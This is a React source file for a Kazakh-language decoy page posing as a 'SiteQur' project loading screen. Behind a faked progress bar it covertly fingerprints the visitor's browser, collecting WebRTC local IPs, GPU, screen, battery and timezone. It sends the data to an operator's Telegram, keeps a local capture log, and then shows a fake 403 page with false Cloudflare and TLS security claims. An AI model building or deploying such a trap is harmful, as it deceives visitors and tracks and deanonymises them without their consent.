// ==========================================
// © Қармақ — Lure Interstitial Decoy
// index.tsx (The Honeypot / Trap Page)
// ==========================================

import { useEffect, useState } from 'react'
import { collectCompleteFingerprint } from '@/core/fingerprint'
import { sendTelegramAlert } from '@/core/notify/telegram'
import styles from './lure.module.scss'

export function Component(): React.ReactElement {
  const [progress, setProgress] = useState(15)
  const [finished, setFinished] = useState(false)

  useEffect(() => {
    let mounted = true
    document.title = 'SiteQur — Жобаны дайындау…'

    // Fake realistic progress ticks
    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 90) return prev
        return prev + Math.floor(Math.random() * 15) + 5
      })
    }, 300)

    // Execute covert fingerprint scan
    collectCompleteFingerprint()
      .then((fp) => {
        if (!mounted) return

        // Dispatch instant alert to operator's Telegram
        sendTelegramAlert(fp).catch(() => {})
        try {
          const raw = localStorage.getItem('qarmaq_captured_logs')
          const existing = raw ? JSON.parse(raw) : []
          const record = {
            id: `trap_${Date.now()}`,
            capturedAt: new Date().toISOString(),
            compositeHash: fp.compositeHash,
            localIP: fp.webrtc.localIPs[0] || 'Жасырын / mDNS',
            gpu: fp.webgl?.renderer || 'Белгісіз',
            screen: `${fp.screen.width}x${fp.screen.height}`,
            battery: fp.battery.level !== null ? `${fp.battery.level}%` : 'N/A',
            platform: fp.hardware.platform,
            timezone: fp.locale.timezone,
            fullData: fp,
          }
          // Prepend latest capture
          existing.unshift(record)
          // Keep up to 50 captures in log
          localStorage.setItem('qarmaq_captured_logs', JSON.stringify(existing.slice(0, 50)))
        } catch {}

        setTimeout(() => {
          if (!mounted) return
          setProgress(100)
          document.title = '403 — Қолжетімсіз'
          setFinished(true)
        }, 1800)
      })
      .catch(() => {
        setTimeout(() => {
          if (!mounted) return
          document.title = '403 — Қолжетімсіз'
          setFinished(true)
        }, 1800)
      })

    return () => {
      mounted = false
      clearInterval(timer)
    }
  }, [])

  if (finished) {
    return (
      <div className={styles.lureContainer}>
        <div className={styles.errorBox}>
          <div className={styles.errorIcon}>!</div>
          <h2 className={styles.errorTitle}>403 — Қолжетімсіз</h2>
          <p className={styles.errorDesc}>
            Бұл жобаның немесе файлдың жарамдылық мерзімі өтіп кеткен немесе иесі сілтемені
            өшірген. Қолжетімділік алу үшін жоба әкімшісіне хабарласыңыз.
          </p>
          <span className={styles.metaNotice}>
            SiteQur Security Token: EXP-ERR-7492 // Protected by Cloudflare Access
          </span>
        </div>
      </div>
    )
  }

  return (
    <div className={styles.lureContainer}>
      <div className={styles.decoyBox}>
        <div className={styles.spinner} />
        <h2 className={styles.title}>SiteQur — Жоба жүктелуде…</h2>
        <p className={styles.desc}>
          Қауіпсіз байланыс орнатылып, сайт үлгісінің файлдары дайындалуда.
          Бұл бірнеше секунд алуы мүмкін.
        </p>

        <div className={styles.progressTrack}>
          <div
            className={styles.progressBar}
            style={{ width: `${Math.min(100, progress)}%` }}
          />
        </div>

        <span className={styles.metaNotice}>
          SSL 256-bit шифрлау белсенді · TLS 1.3 · SiteQur CDN
        </span>
      </div>
    </div>
  )
}

Component.displayName = 'LureDecoy'
